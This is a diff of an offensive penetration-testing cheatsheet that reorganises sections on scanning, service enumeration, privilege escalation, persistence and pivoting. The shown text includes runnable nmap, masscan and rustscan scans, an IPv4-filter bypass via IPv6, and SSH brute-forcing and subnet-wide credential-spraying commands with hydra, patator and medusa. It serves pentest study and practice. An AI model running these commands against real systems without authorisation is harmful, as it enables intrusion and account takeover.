@@ -10,174 +10,181 @@ Other great cheetsheets:
 # 2. Table of Contents
 - [1. Pentesting Cheatsheet](#1-pentesting-cheatsheet)
 - [2. Table of Contents](#2-table-of-contents)
-- [3. Scanning and Enumeration](#3-scanning-and-enumeration)
-  - [3.1. Nmap Scanning](#31-nmap-scanning)
-  - [3.2. Rustscan](#32-rustscan)
-  - [3.3. Simple Ping Scanner](#33-simple-ping-scanner)
-  - [3.4. Simple Port Scanner](#34-simple-port-scanner)
-  - [3.5. 25,465,587 - SMTP/s Enumeration](#35-25465587---smtps-enumeration)
-  - [3.6. 53 - DNS Enumeration](#36-53---dns-enumeration)
-    - [3.6.1. DNS Zone Transfer](#361-dns-zone-transfer)
-    - [3.6.2. Bruteforcing DNS Records](#362-bruteforcing-dns-records)
-  - [3.7. 80,443 - Web Enumeration](#37-80443---web-enumeration)
-    - [3.7.1. Web Server Software Enumeration](#371-web-server-software-enumeration)
-    - [3.7.2. Web Directory Scanning](#372-web-directory-scanning)
-    - [3.7.3. Common Web Vuln scanning with Nikto](#373-common-web-vuln-scanning-with-nikto)
-    - [3.7.4. WordPress Enumeration](#374-wordpress-enumeration)
-  - [3.8. 88/749 Kerberos Enumeration](#38-88749-kerberos-enumeration)
-  - [3.9. 110,995 - POP Enumeration](#39-110995---pop-enumeration)
-  - [3.10. 111 - RPCbind Enumeration](#310-111---rpcbind-enumeration)
-  - [3.11. 119 - NNTP Enumeration](#311-119---nntp-enumeration)
-  - [3.12. 135 - MSRPC Enumeration](#312-135---msrpc-enumeration)
-  - [3.13. 139,445 - SMB Enumeration](#313-139445---smb-enumeration)
-    - [3.13.1. Listing SMB Shares](#3131-listing-smb-shares)
-    - [3.13.2. Interacting on SMB](#3132-interacting-on-smb)
-  - [3.14. 161,162,10161,10162 - Simple Network Management Protocol (SNMP)](#314-1611621016110162---simple-network-management-protocol-snmp)
-  - [3.14. 1433 - Microsoft SQL Server Enumeration](#314-1433---microsoft-sql-server-enumeration)
-    - [3.14.1. MS SQL Server Command Execution](#3141-ms-sql-server-command-execution)
-  - [3.15. 2049 - NFS Enumeration](#315-2049---nfs-enumeration)
-  - [3.16. 3306 - MySQL Enumeration](#316-3306---mysql-enumeration)
-    - [3.16.1. MySQL UDF Exploit](#3161-mysql-udf-exploit)
-    - [3.16.2. Grabbing MySQL Passwords](#3162-grabbing-mysql-passwords)
-    - [3.16.3. Useful MySQL Files](#3163-useful-mysql-files)
-  - [3.17. 5900 - VNC Enumeration](#317-5900---vnc-enumeration)
-  - [3.18. 27017 - MongoDB Enumeration](#318-27017---mongodb-enumeration)
-    - [3.18.1. Exploiting NoSQL Injection](#3181-exploiting-nosql-injection)
-  - [3.19. Amazon Web Services (AWS) S3 Buckets](#319-amazon-web-services-aws-s3-buckets)
-    - [3.19.1. AWS Identity and Access Management (IAM)](#3191-aws-identity-and-access-management-iam)
-      - [3.19.1.1. IAM Access Keys](#31911-iam-access-keys)
-      - [3.19.1.2. Conducting Reconnaissance with IAM](#31912-conducting-reconnaissance-with-iam)
-      - [3.19.1.3. AWS ARNs](#31913-aws-arns)
-  - [3.20. IPv6 to bypass IPv4 filters](#320-ipv6-to-bypass-ipv4-filters)
-- [4. Exploitation](#4-exploitation)
-  - [4.1. Searchsploit](#41-searchsploit)
-  - [4.2. Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
-    - [4.2.1. Cracking with John The Ripper](#421-cracking-with-john-the-ripper)
-    - [4.2.2. Cracking with Hashcat](#422-cracking-with-hashcat)
-    - [4.2.3. MS SQL Server Bruteforcing](#423-ms-sql-server-bruteforcing)
-    - [4.2.4. SMB Bruteforcing](#424-smb-bruteforcing)
-    - [4.2.5. SSH Bruteforcing](#425-ssh-bruteforcing)
-    - [4.2.6. Web Form (HTTP POST) Bruteforcing](#426-web-form-http-post-bruteforcing)
-    - [4.2.7. Zip File Password Cracking](#427-zip-file-password-cracking)
-  - [4.3. Port Knocking](#43-port-knocking)
-  - [4.4. Buffer Overflows](#44-buffer-overflows)
-  - [4.5. PHP Exploitation](#45-php-exploitation)
-    - [4.5.1. LFI/RFI](#451-lfirfi)
-    - [4.5.2. One-liner PHP Webshells](#452-one-liner-php-webshells)
-  - [4.6. Reverse Shells](#46-reverse-shells)
-    - [4.6.1. Covering your tracks](#461-covering-your-tracks)
-    - [4.6.2. Running a detached/daeminized process on Linux](#462-running-a-detacheddaeminized-process-on-linux)
-  - [4.7. Encryption](#47-encryption)
-    - [4.7.1. Create self-signed SSL/TLS certificate](#471-create-self-signed-ssltls-certificate)
-    - [4.7.2. Decrypting files with GPG](#472-decrypting-files-with-gpg)
-  - [4.8. Post Exploit Frameworks](#48-post-exploit-frameworks)
-    - [4.8.1. Merlin Framework](#481-merlin-framework)
-- [5. Windows Privilege Escalation](#5-windows-privilege-escalation)
-  - [5.1. Basic Windows Post-Exploit Enumeration](#51-basic-windows-post-exploit-enumeration)
-  - [5.2. Using Saved Windows Credentials](#52-using-saved-windows-credentials)
-  - [5.3. Check Windows File Permissions](#53-check-windows-file-permissions)
-  - [5.4. Antivirus & Firewall Evasion](#54-antivirus--firewall-evasion)
-    - [5.4.1. Windows AMSI Bypass](#541-windows-amsi-bypass)
-    - [5.4.2. Turn off Windows Firewall](#542-turn-off-windows-firewall)
-    - [5.4.3. Turn off Windows Defender](#543-turn-off-windows-defender)
-    - [5.4.4. Windows LOLBAS Encoding/Decoding](#544-windows-lolbas-encodingdecoding)
-    - [5.4.5. Execute Inline Tasks with MSBuild.exe](#545-execute-inline-tasks-with-msbuildexe)
-    - [5.4.6. Custom Windows TCP Reverse Shell](#546-custom-windows-tcp-reverse-shell)
-  - [5.5. Windows UAC Bypass](#55-windows-uac-bypass)
-  - [5.6. Windows Pass-The-Hash Attacks](#56-windows-pass-the-hash-attacks)
-  - [5.7. Windows Token Impersonation](#57-windows-token-impersonation)
-    - [5.7.1. Windows Token Impersonation with RoguePotato](#571-windows-token-impersonation-with-roguepotato)
-    - [5.7.2. Windows Token Impersonation with PrintSpoofer](#572-windows-token-impersonation-with-printspoofer)
-    - [5.7.3. Windows Service Escalation - Registry](#573-windows-service-escalation---registry)
-  - [5.8. Compiling Windows Binaries on Linux](#58-compiling-windows-binaries-on-linux)
-  - [5.9. Miscellaneous Windows Commands](#59-miscellaneous-windows-commands)
-  - [5.10. Lateral Movement in Windows Active Directory](#510-lateral-movement-in-windows-active-directory)
-    - [5.10.1. Quick Active Directory Enumeration](#5101-quick-active-directory-enumeration)
-- [6. Linux Privilege Escalation](#6-linux-privilege-escalation)
-  - [6.1. Basic Linux Post-Exploit Enumeration](#61-basic-linux-post-exploit-enumeration)
-  - [6.2. Watching for Linux Process Changes](#62-watching-for-linux-process-changes)
-  - [6.3. Adding root user to /etc/shadow or /etc/passwd](#63-adding-root-user-to-etcshadow-or-etcpasswd)
-  - [6.4. Escalating via sudo binaries](#64-escalating-via-sudo-binaries)
-  - [6.5. LD_PRELOAD and LD_LIBRARY_PATH](#65-ld_preload-and-ld_library_path)
-  - [6.6. SUID binaries](#66-suid-binaries)
-  - [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
-  - [6.8. Linux Kernel Exploits](#68-linux-kernel-exploits)
-    - [6.8.1. Dirty Cow Linux Privesc](#681-dirty-cow-linux-privesc)
-- [7. Loot](#7-loot)
+- [3. Scanning](#3-scanning)
+  - [3.1. Rustscan](#31-rustscan)
+  - [3.2. Nmap](#32-nmap)
+  - [3.3. IPv6 to bypass IPv4 filters](#33-ipv6-to-bypass-ipv4-filters)
+  - [3.4. Simple Ping Scanner](#34-simple-ping-scanner)
+  - [3.5. Bash Port Scanner](#35-bash-port-scanner)
+- [4. Services](#4-services)
+  - [4.1. 22 - SSH/SFTP](#41-22---sshsftp)
+    - [4.1.1. SSH Bruteforcing](#411-ssh-bruteforcing)
+  - [4.2. 25,465,587 - SMTP/s](#42-25465587---smtps)
+  - [4.3. 53 - DNS](#43-53---dns)
+    - [4.3.1. DNS Zone Transfer](#431-dns-zone-transfer)
+    - [4.3.2. Bruteforcing DNS Records](#432-bruteforcing-dns-records)
+  - [4.4. 80,443 - HTTP(s)](#44-80443---https)
+    - [4.4.1. Web Scanning/Enumeration](#441-web-scanningenumeration)
+    - [4.4.2. Web Bruteforcing](#442-web-bruteforcing)
+    - [4.4.3. PHP Exploitation](#443-php-exploitation)
+      - [4.4.3.1. LFI/RFI](#4431-lfirfi)
+      - [4.4.3.2. One-liner PHP Webshells](#4432-one-liner-php-webshells)
+    - [4.4.4. WordPress](#444-wordpress)
+  - [4.5. 88/749 Kerberos](#45-88749-kerberos)
+  - [4.6. 110,995 - POP](#46-110995---pop)
+  - [4.7. 111 - RPCbind](#47-111---rpcbind)
+  - [4.8. 119 - NNTP](#48-119---nntp)
+  - [4.9. 135 - MSRPC](#49-135---msrpc)
+  - [4.10. 139,445 - SMB](#410-139445---smb)
+    - [4.10.1. SMB Bruteforcing](#4101-smb-bruteforcing)
+    - [4.10.2. Interacting with SMB](#4102-interacting-with-smb)
+  - [4.11. 161,162,10161,10162 - SNMP](#411-1611621016110162---snmp)
+    - [4.11.1. Exploring MIBs with `snmptranslate`](#4111-exploring-mibs-with-snmptranslate)
+    - [4.11.2. RCE with SNMP](#4112-rce-with-snmp)
+  - [4.12. 1433 - MSSQL](#412-1433---mssql)
+    - [4.12.1. MSSQL Bruteforcing](#4121-mssql-bruteforcing)
+    - [4.12.2. MSSQL Interaction](#4122-mssql-interaction)
+    - [4.12.3. MSSQL Command Execution](#4123-mssql-command-execution)
+  - [4.13. 2049 - NFS](#413-2049---nfs)
+  - [4.14. 3306 - MySQL Enumeration](#414-3306---mysql-enumeration)
+    - [4.14.1. MySQL UDF Exploit](#4141-mysql-udf-exploit)
+    - [4.14.2. Grabbing MySQL Passwords](#4142-grabbing-mysql-passwords)
+    - [4.14.3. Useful MySQL Files](#4143-useful-mysql-files)
+  - [4.15. 5900 - VNC](#415-5900---vnc)
+  - [4.16. 27017 - MongoDB](#416-27017---mongodb)
+    - [4.16.1. Exploiting NoSQL Injection](#4161-exploiting-nosql-injection)
+  - [4.17. Amazon Web Services (AWS) S3 Buckets](#417-amazon-web-services-aws-s3-buckets)
+    - [4.17.1. AWS Identity and Access Management (IAM)](#4171-aws-identity-and-access-management-iam)
+      - [4.17.1.1. IAM Access Keys](#41711-iam-access-keys)
+      - [4.17.1.2. Conducting Reconnaissance with IAM](#41712-conducting-reconnaissance-with-iam)
+      - [4.17.1.3. AWS ARNs](#41713-aws-arns)
+- [5. Exploitation](#5-exploitation)
+  - [5.1. Searchsploit](#51-searchsploit)
+  - [5.2. Password Bruteforcing and Cracking](#52-password-bruteforcing-and-cracking)
+    - [5.2.1. Cracking with John The Ripper](#521-cracking-with-john-the-ripper)
+    - [5.2.2. Cracking with Hashcat](#522-cracking-with-hashcat)
+    - [5.2.3. Zip File Password Cracking](#523-zip-file-password-cracking)
+  - [5.3. Port Knocking](#53-port-knocking)
+  - [5.4. Buffer Overflows](#54-buffer-overflows)
+  - [5.5. Reverse Shells](#55-reverse-shells)
+    - [5.5.1. Covering your tracks](#551-covering-your-tracks)
+    - [5.5.2. Running a detached/daeminized process on Linux](#552-running-a-detacheddaeminized-process-on-linux)
+  - [5.6. Encryption](#56-encryption)
+    - [5.6.1. Create self-signed SSL/TLS certificate](#561-create-self-signed-ssltls-certificate)
+    - [5.6.2. Decrypting files with GPG](#562-decrypting-files-with-gpg)
+- [6. Windows](#6-windows)
+  - [6.1. Basic Windows Post-Exploit Enumeration](#61-basic-windows-post-exploit-enumeration)
+  - [6.2. Using Saved Windows Credentials](#62-using-saved-windows-credentials)
+  - [6.3. Check Windows File Permissions](#63-check-windows-file-permissions)
+  - [6.4. Antivirus & Firewall Evasion](#64-antivirus--firewall-evasion)
+    - [6.4.1. Windows AMSI Bypass](#641-windows-amsi-bypass)
+    - [6.4.2. Turn off Windows Firewall](#642-turn-off-windows-firewall)
+    - [6.4.3. Turn off Windows Defender](#643-turn-off-windows-defender)
+    - [6.4.4. Windows LOLBAS Encoding/Decoding](#644-windows-lolbas-encodingdecoding)
+    - [6.4.5. Execute Inline Tasks with MSBuild.exe](#645-execute-inline-tasks-with-msbuildexe)
+    - [6.4.6. Custom Windows TCP Reverse Shell](#646-custom-windows-tcp-reverse-shell)
+  - [6.5. Windows UAC Bypass](#65-windows-uac-bypass)
+  - [6.6. Windows Pass-The-Hash Attacks](#66-windows-pass-the-hash-attacks)
+  - [6.7. Windows Token Impersonation](#67-windows-token-impersonation)
+    - [6.7.1. Windows Token Impersonation with RoguePotato](#671-windows-token-impersonation-with-roguepotato)
+    - [6.7.2. Windows Token Impersonation with PrintSpoofer](#672-windows-token-impersonation-with-printspoofer)
+    - [6.7.3. Windows Service Escalation - Registry](#673-windows-service-escalation---registry)
+  - [6.8. Compiling Windows Binaries on Linux](#68-compiling-windows-binaries-on-linux)
+  - [6.9. Windows Passwords & Hashes](#69-windows-passwords--hashes)
+    - [6.9.1. Finding Windows Passwords in Files](#691-finding-windows-passwords-in-files)
+      - [6.9.1.1. Files with Passwords on Windows](#6911-files-with-passwords-on-windows)
+    - [6.9.2. Windows Passwords in Registry](#692-windows-passwords-in-registry)
+    - [6.9.3. Getting Saved Wifi Passwords on Windows](#693-getting-saved-wifi-passwords-on-windows)
+    - [6.9.4. Dumping Hashes from Windows](#694-dumping-hashes-from-windows)
+      - [6.9.4.1. Dumping Hashes from Windows Registry Backups](#6941-dumping-hashes-from-windows-registry-backups)
+      - [6.9.4.2. Dumping Hashes from Windows Domain Controller](#6942-dumping-hashes-from-windows-domain-controller)
+    - [6.9.5. Using mimikatz to dump hashes and passwords](#695-using-mimikatz-to-dump-hashes-and-passwords)
+  - [6.10. Windows Files of Interest](#610-windows-files-of-interest)
+  - [6.11. Lateral Movement in Windows Active Directory](#611-lateral-movement-in-windows-active-directory)
+    - [6.11.1. Quick Active Directory Enumeration](#6111-quick-active-directory-enumeration)
+  - [6.12. Miscellaneous Windows Commands](#612-miscellaneous-windows-commands)
+  - [6.13. Windows Persistence](#613-windows-persistence)
+    - [6.13.1. Remote SYSTEM Backdoor](#6131-remote-system-backdoor)
+      - [6.13.1.1. Using Windows Services](#61311-using-windows-services)
+      - [6.13.1.2. Using PSExec](#61312-using-psexec)
+      - [6.13.1.3. Using Scheduled Tasks](#61313-using-scheduled-tasks)
+    - [6.13.2. Remote Admin Backdoor via WMIC](#6132-remote-admin-backdoor-via-wmic)
+    - [6.13.3. Add RDP User](#6133-add-rdp-user)
+    - [6.13.4. Connect to Windows RDP](#6134-connect-to-windows-rdp)
+    - [6.13.5. Change Windows Domain Credentials](#6135-change-windows-domain-credentials)
+    - [6.13.6. Create Windows Backdoor Service](#6136-create-windows-backdoor-service)
+- [7. Linux](#7-linux)
   - [7.1. Upgrading to Interactive Shell](#71-upgrading-to-interactive-shell)
-  - [7.2. File Transfers](#72-file-transfers)
-    - [7.2.1. Netcat transfer](#721-netcat-transfer)
-    - [7.2.2. Curl transfers](#722-curl-transfers)
-    - [7.2.3. PowerShell File Transfers](#723-powershell-file-transfers)
-    - [7.2.4. Mount NFS Share](#724-mount-nfs-share)
-    - [7.2.5. SMB Share](#725-smb-share)
-    - [7.2.6. FTP Server on Kali](#726-ftp-server-on-kali)
-    - [7.2.7. SSHFS](#727-sshfs)
-    - [7.2.8. Windows LOLBAS File Downloads](#728-windows-lolbas-file-downloads)
-    - [7.2.9. PHP File Uploads](#729-php-file-uploads)
-  - [7.3. Grabbing Passwords](#73-grabbing-passwords)
-    - [7.3.1. Finding Windows Passwords](#731-finding-windows-passwords)
-    - [7.3.2. Windows Passwords in Registry](#732-windows-passwords-in-registry)
-    - [7.3.3. Files with Passwords on Windows](#733-files-with-passwords-on-windows)
-    - [7.3.4. Getting Saved Wifi Passwords on Windows](#734-getting-saved-wifi-passwords-on-windows)
-    - [7.3.5. Dumping Hashes from Windows](#735-dumping-hashes-from-windows)
-      - [7.3.5.1. Dumping Hashes from Windows Domain Controller](#7351-dumping-hashes-from-windows-domain-controller)
-    - [7.3.6. Using mimikatz to dump hashes and passwords](#736-using-mimikatz-to-dump-hashes-and-passwords)
-  - [7.4. Windows Files of Interest](#74-windows-files-of-interest)
-  - [7.5. Linux Files of Interest](#75-linux-files-of-interest)
-  - [7.6. Data Wrangling on Linux](#76-data-wrangling-on-linux)
-    - [7.6.1. Awk & Sed](#761-awk--sed)
-- [8. Windows Persistence](#8-windows-persistence)
-  - [8.1. Remote SYSTEM Backdoor](#81-remote-system-backdoor)
-    - [8.1.1. Using Windows Services](#811-using-windows-services)
-    - [8.1.2. Using PSExec](#812-using-psexec)
-    - [8.1.3. Using Scheduled Tasks](#813-using-scheduled-tasks)
-  - [8.2. Remote Admin Backdoor via WMIC](#82-remote-admin-backdoor-via-wmic)
-  - [8.3. Add RDP User](#83-add-rdp-user)
-  - [8.4. Connect to Windows RDP](#84-connect-to-windows-rdp)
-  - [8.5. Change Windows Domain Credentials](#85-change-windows-domain-credentials)
-  - [8.6. Create Windows Backdoor Service](#86-create-windows-backdoor-service)
-- [9. Linux Persistence](#9-linux-persistence)
-  - [9.1. Grant passwordless sudo access](#91-grant-passwordless-sudo-access)
-  - [9.2. Setting SUID bit](#92-setting-suid-bit)
-- [10. Pivoting and Redirection](#10-pivoting-and-redirection)
-  - [10.1. SSH Tunnels](#101-ssh-tunnels)
-  - [10.2. SOCKS Proxies and proxychains](#102-socks-proxies-and-proxychains)
-  - [10.3. Bending with iptables](#103-bending-with-iptables)
-  - [10.4. Bending with socat](#104-bending-with-socat)
-  - [10.5. Bending with rinetd](#105-bending-with-rinetd)
-  - [10.6. Bending with netsh](#106-bending-with-netsh)
-  - [10.7. Bending with sshuttle](#107-bending-with-sshuttle)
-  - [10.8. Bending with chisel](#108-bending-with-chisel)
-  - [10.9. Bending with netcat](#109-bending-with-netcat)
-- [11. Miscellaneous](#11-miscellaneous)
-  - [11.1. Disable SSH Host Key Checking](#111-disable-ssh-host-key-checking)
-  - [11.2. Use Legacy Key Exchange Algorithm or Cipher with SSH](#112-use-legacy-key-exchange-algorithm-or-cipher-with-ssh)
-  - [11.3. Convert text to Windows UTF-16 format on Linux](#113-convert-text-to-windows-utf-16-format-on-linux)
-  - [11.4. Extract UDP pcap packet payload data](#114-extract-udp-pcap-packet-payload-data)
-  - [11.5. Execute Shellcode from Bash](#115-execute-shellcode-from-bash)
+  - [7.2. Basic Linux Post-Exploit Enumeration](#72-basic-linux-post-exploit-enumeration)
+  - [7.3. Watching for Linux Process Changes](#73-watching-for-linux-process-changes)
+  - [7.4. Adding root user to /etc/shadow or /etc/passwd](#74-adding-root-user-to-etcshadow-or-etcpasswd)
+  - [7.5. Escalating via sudo binaries](#75-escalating-via-sudo-binaries)
+  - [7.6. LD_PRELOAD and LD_LIBRARY_PATH](#76-ld_preload-and-ld_library_path)
+  - [7.7. SUID binaries](#77-suid-binaries)
+  - [7.8. Using NFS for Privilege Escalation](#78-using-nfs-for-privilege-escalation)
+  - [7.9. Linux Kernel Exploits](#79-linux-kernel-exploits)
+    - [7.9.1. Dirty Cow Linux Privesc](#791-dirty-cow-linux-privesc)
+  - [7.10. Linux Files of Interest](#710-linux-files-of-interest)
+  - [7.11. Data Wrangling on Linux](#711-data-wrangling-on-linux)
+    - [7.11.1. Awk & Sed](#7111-awk--sed)
+  - [7.12. Linux Persistence](#712-linux-persistence)
+    - [7.12.1. Grant passwordless sudo access](#7121-grant-passwordless-sudo-access)
+    - [7.12.2. Setting SUID bit](#7122-setting-suid-bit)
+- [8. Loot](#8-loot)
+  - [8.1. File Transfers](#81-file-transfers)
+    - [8.1.1. Netcat transfer](#811-netcat-transfer)
+    - [8.1.2. Curl transfers](#812-curl-transfers)
+    - [8.1.3. PowerShell File Transfers](#813-powershell-file-transfers)
+    - [8.1.4. Mount NFS Share](#814-mount-nfs-share)
+    - [8.1.5. SMB Share](#815-smb-share)
+    - [8.1.6. FTP Server on Kali](#816-ftp-server-on-kali)
+    - [8.1.7. SSHFS](#817-sshfs)
+    - [8.1.8. Windows LOLBAS File Downloads](#818-windows-lolbas-file-downloads)
+    - [8.1.9. PHP File Uploads](#819-php-file-uploads)
+- [9. Pivoting and Redirection](#9-pivoting-and-redirection)
+  - [9.1. SSH Tunnels](#91-ssh-tunnels)
+    - [9.1.1. Ad Hoc SSH Port Forwards](#911-ad-hoc-ssh-port-forwards)
+  - [9.2. SOCKS Proxies and proxychains](#92-socks-proxies-and-proxychains)
+  - [9.3. Bending with iptables](#93-bending-with-iptables)
+  - [9.4. Bending with socat](#94-bending-with-socat)
+  - [9.5. Bending with rinetd](#95-bending-with-rinetd)
+  - [9.6. Bending with netsh](#96-bending-with-netsh)
+  - [9.7. Bending with sshuttle](#97-bending-with-sshuttle)
+  - [9.8. Bending with chisel](#98-bending-with-chisel)
+  - [9.9. Bending with netcat](#99-bending-with-netcat)
+- [10. Miscellaneous](#10-miscellaneous)
+  - [10.1. Disable SSH Host Key Checking](#101-disable-ssh-host-key-checking)
+  - [10.2. Use Legacy Key Exchange Algorithm or Cipher with SSH](#102-use-legacy-key-exchange-algorithm-or-cipher-with-ssh)
+  - [10.3. Convert text to Windows UTF-16 format on Linux](#103-convert-text-to-windows-utf-16-format-on-linux)
+  - [10.4. Extract UDP pcap packet payload data](#104-extract-udp-pcap-packet-payload-data)
+  - [10.5. Execute Shellcode from Bash](#105-execute-shellcode-from-bash)
 
-# 3. Scanning and Enumeration
+# 3. Scanning
 
-## 3.1. Nmap Scanning
+## 3.1. Rustscan
+
+Rustscan is a faster way to discover all open ports and autorun Nmap to do the
+script scanning on those ports.
+
+```sh
+VICTIM_IP=VICTIM_IP
+sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -v -n -Pn --script "default,safe,vuln" -sV -oA all-ports
+```
+
+## 3.2. Nmap
 
 If using scripts, you can get script help by `nmap --script-help="nfs-*"`.
 
 ```sh
-# preferred initial scan:
-# verbose, no DNS resolution, default scripts/enumerate versions/detect OS/traceroute, output all formats
-VICTIM_IP=VICTIM_IP
-mkdir -p scans/nmap; cd scans; nmap -v -n -A -oA nmap/initial-scan $VICTIM_IP
+# fast full TCP discovery using massscan:
+sudo masscan -p1-65535 $VICTIM_IP --rate=1000 -e tun0 > masscan.txt
+ports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\n' ',' | sed 's/,$//')
+sudo nmap -v -n -p $ports -oA nmap/tcp-all -Pn --script "default,safe,vuln" -sV $VICTIM_IP
 
 # all TCP ports, fast discovery, then script scan:
 # verbose, no DNS resolution, fastest timing, all TCP ports, output all formats
 ports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM_IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
 nmap -n -v -sC -sV -Pn -p $ports -oA nmap/tcp-all $VICTIM_IP
-
-# fast full TCP discovery using massscan:
-sudo masscan -p1-65535 $VICTIM_IP --rate=1000 -e tun0 > masscan.txt
-tcpports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\n' ',' | sed 's/,$//')
-sudo nmap -n -p $tcpports -oA nmap/tcp-all -Pn --script "default,safe,vuln" -sV $VICTIM_IP
 
 # UDP fast scan (top 100)
 sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA nmap/udp-fast $VICTIM_IP
@@ -189,17 +196,46 @@ sudo nmap -n -v -sU -T4 --top-ports=20 --reason --open -oA nmap/udp-top20 $VICTI
 nmap --script="safe and ftp-*" -v -n -p 21 -oA nmap/safe-ftp $VICTIM_IP
 ```
 
-## 3.2. Rustscan
+## 3.3. IPv6 to bypass IPv4 filters
 
-Rustscan is a faster way to discover all open ports and autorun Nmap to do the
-script scanning on those ports.
+Sometimes if you see `filtered` on an nmap scan, the filter may only be applied on IPv4, but not IPv6. Try scanning it again using the host's IPv6 address.
 
-```sh
-VICTIM_IP=VICTIM_IP
-mkdir -p scans/nmap; cd scans; sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -n -Pn -A -oA nmap/all-ports
+```bash
+# First take note of MAC address from nmap scan of device with 'filtered' port.
+# NOTE: nmap must be run as sudo to get MAC address.
+# If you don't have the MAC from nmap, you can probably get it from
+# your arp table with `arp -an`. If you have a hostname, you can
+# do a DNS lookup for the AAAA record.
+
+# get list of IPv6 neighbors on tun0 interface
+ping6 -c2 ff02::1%tun0 >/dev/null
+ip -6 n | grep -i MACADDR
+
+# Then rescan using nmap's IPv6 mode
+sudo nmap -6 -n -v -sC -sV -p FILTERED_PORT IPV6_ADDR
 ```
 
-## 3.3. Simple Ping Scanner
+Here is another example of a script to try to get the link-local IPv6 address by building the EUI format from the MAC:
+
+```bash
+#!/bin/bash -e
+# Usage: ./ipv4to6.sh 192.168.0.1
+# source: https://askubuntu.com/a/771914
+
+IP=$1
+ping -c 1 $1 > /dev/null 2> /dev/null
+MAC=$(arp -an $1 | awk '{ print $4 }')
+IFACE=$(arp -an $1 | awk '{ print $7 }')
+
+python3 -c "
+from netaddr import IPAddress
+from netaddr.eui import EUI
+mac = EUI(\"$MAC\")
+ip = mac.ipv6(IPAddress('fe80::'))
+print('{ip}%{iface}'.format(ip=ip, iface=\"$IFACE\"))"
+```
+
+## 3.4. Simple Ping Scanner
 
 Pings all hosts in a /24 subnet. Provide any IP address in the subnet as arg.
 
@@ -221,14 +257,11 @@ And here's a one-liner to do it in windows:
 ```bat
 :: note: meant to be copy-pasted, not in .bat script (%i vs %%i)
 for /L %i in (1,1,255) do @ping -n 1 -w 2 10.2.2.%i | findstr "Reply"
-:: alternate (excludes valuable TTL info)
-for /L %i in (1,1,255) do @ping -n 1 -w 2 10.2.2.%i > nul && echo 10.2.2.%i is up.
 ```
 
-## 3.4. Simple Port Scanner
+## 3.5. Bash Port Scanner
 
-Scans all 65535 ports of a single host. Provide host IP as arg. Only works on
-LINUX systems!
+Scans all 65535 ports of a single host. Provide host IP as arg. Only works on Linux systems using bash!
 
 ```sh
 #!/bin/bash
@@ -241,7 +274,36 @@ wait $(jobs -rp)
 echo "Done"
 ```
 
-## 3.5. 25,465,587 - SMTP/s Enumeration
+# 4. Services
+
+This section includes enumeration, exploitation, and interaction techniques for common services you might discover through scanning.
+
+## 4.1. 22 - SSH/SFTP
+
+Secure Shell (SSH) and Secure File Transfer Protocol (SFTP).
+
+For extremely old versions, check `searchsploit` for vulns. Otherwise, brute-force and user enumeration are usually all you get out of it.
+
+Check [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh) for executing commands with misconfigured SFTP user.
+
+### 4.1.1. SSH Bruteforcing
+
+```sh
+# using hydra
+# '-s PORT' contact service on non-default port
+hydra -V -f -l username -P wordlist.txt -s 2222 $VICTIM_IP ssh
+
+# spray creds to entire subnet to see if they work on other boxes, too!
+hydra -V -f -l username -p password -W 5 10.11.1.0/24 ssh
+
+# using patator: useful when services (e.g. ssh) are too old for hydra to work
+patator ssh_login host=$VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+
+ncrack -p 22 --user root -P passwords.txt $VICTIM_IP [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h $VICTIM_IP -M ssh
+```
+
+## 4.2. 25,465,587 - SMTP/s
 
 ```sh
 # Banner grab, command/user enum
@@ -271,12 +333,12 @@ Other ideas:
 
 See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)
 
-## 3.6. 53 - DNS Enumeration
+## 4.3. 53 - DNS
 
 **PRO TIP**: Make sure you add the DNS entries you discover to your
 `/etc/hosts` file. Some web servers do redirection based on domain name!
 
-**Format of `/etc/hosts` entry**:
+**Format of `/etc/hosts` entry with multiple subdomains**:
 
 ```
 10.10.10.10     victim.com mail.victim.com www.victim.com admin.victim.com
@@ -295,7 +357,7 @@ dnsrecon -a -s -b -y -k -w -d domain.tld
 # fierce does a more abbreviated full-enumeration (good for preliminary look)
 fierce --domain domain.tld
 
-# dig zone xfer
+# dig zone xfer, note "@" before nameserver
 dig @ns1.domain.tld -t axfr domain.tld
 ```
 
@@ -308,7 +370,7 @@ dig @ns1.domain.tld -t axfr domain.tld
 - `CNAME`: Canonical Name Records are used to create aliases for other host records.
 - `TXT`: Text records can contain any arbitrary data and can be used for various purposes, such as domain ownership verification.
 
-### 3.6.1. DNS Zone Transfer
+### 4.3.1. DNS Zone Transfer
 
 This is basically asking for a copy of all DNS entries served by an authoritative server.
 It lets you get a list of other subdomains that might be of interest.
@@ -325,7 +387,7 @@ dig @ns1.nameserver.tld axfr domain.tld
 host -l domain.tld ns1.nameserver.tld
 ```
 
-### 3.6.2. Bruteforcing DNS Records
+### 4.3.2. Bruteforcing DNS Records
 
 ```sh
 # using dnsrecon
@@ -338,29 +400,91 @@ dnsenum --noreverse -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top
 nmap -vv -Pn -T4 -p 53 --script dns-brute domain.tld
 ```
 
-## 3.7. 80,443 - Web Enumeration
+## 4.4. 80,443 - HTTP(s)
 
-Always check:
-- [ ] server software in use (via nmap/whatweb) for vulns.
-- [ ] robots.txt
-- [ ] HTML comments
+Scans to run every time:
 
-### 3.7.1. Web Server Software Enumeration
+```bash
+# enumerate version info of tech stack, find emails, domains, etc.
+whatweb -v -a3 --log-verbose whatweb.txt $VICTIM_IP
 
-Whatweb shows more details about tech stacks in use by server.
+# Gobuster directory/file discovery
+# Other extensions to add: asp,aspx,jsp,cgi,pl,py,sh,
+ulimit -n 8192 # prevent file access error during scanning
